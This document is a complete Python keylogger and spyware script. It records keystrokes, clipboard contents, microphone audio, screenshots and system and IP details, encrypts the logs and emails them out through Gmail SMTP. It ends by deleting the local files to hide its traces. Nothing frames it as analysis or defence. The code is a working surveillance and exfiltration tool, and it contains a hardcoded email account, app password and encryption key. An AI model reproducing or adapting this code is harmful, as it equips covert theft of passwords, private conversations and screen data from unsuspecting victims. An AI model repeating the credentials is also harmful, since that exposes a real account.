# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"

keys_information_encryption = "e_key_log.txt"
system_information_encryption = "e_system_info.txt"
clipboard_information_encryption = "e_clipboard_info.txt"

audio_information= "audio.wav"
microphone_time = 10

screenshot_information = "ss.png"

time_iteration = 15
number_of_iterations_end = 3

email_address = "harshitkumar10024@gmail.com"
password = "uequxcdcdfueiqvx"

username = getpass.getuser()

toaddr = "harshitkumar10024@gmail.com"

key = "HK6R8PL5yhXhD1RnxBrwibnS7atZWQCfSevWNQ33BOs="

file_path = "C:\\Users\\Harshit\\PycharmProjects\\Keylogger\\Project"
extend = "\\"
file_merge = file_path + extend

#Email Controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

#Getting the Computer Information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_IP = get("https://api.ipify.org").text
            f.write("Public IP Adrress: " + public_IP)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddress + '\n')

computer_information()

#Getting the Clipboard Contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("CLipboard could not be copied")

copy_clipboard()

# Getting audio from microphone
def microphone():
    ffs = 44100
    seconds = microphone_time

    recording = sd.rec(int(seconds * ffs), samplerate= ffs, channels= 2)
    sd.wait()

    write(file_path + extend + audio_information, ffs, recording)

microphone()

# Getting screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
CurrentTime = time.time()
StoppingTIme = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, CurrentTime

        print(key)
        keys.append(key)
        count += 1
        CurrentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write('\n')
                        f.close()
                    elif k.find("Key") == -1:
                        f.write(k)
                        f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if CurrentTime > StoppingTIme:
            return False

    with Listener(on_press=on_press,  on_release=on_release) as listener:
        listener.join()

    if CurrentTime > StoppingTIme:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        CurrentTime = time.time()
        StoppingTIme = time.time() + time_iteration

# Encrypting files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_encryption, file_merge + clipboard_information_encryption, file_merge + keys_information_encryption]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120) #adding delay to count for time taken for email to properly be sent

# Clean up the tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)

